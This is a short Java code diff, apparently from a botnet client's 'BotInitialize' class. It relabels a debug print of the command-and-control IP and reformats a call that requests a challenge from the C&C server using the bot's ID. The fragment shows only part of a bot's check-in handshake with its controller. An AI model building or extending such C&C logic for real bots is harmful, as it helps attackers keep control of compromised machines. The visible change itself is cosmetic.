@@ -80,10 +80,9 @@ public class BotInitialize {
 
 	private boolean challengeToCommandConquer() {
 		//
-		System.out.println(networkService.getCommandConquerIps().getIPList().get(0));
+		System.out.println("IP C&C "+networkService.getCommandConquerIps().getIPList().get(0));
 
-		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),
-				networkService.getCommandConquerIps().getIPList().get(0));
+		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),networkService.getCommandConquerIps().getIPList().get(0));
 
 		if (challenge != null) {
 
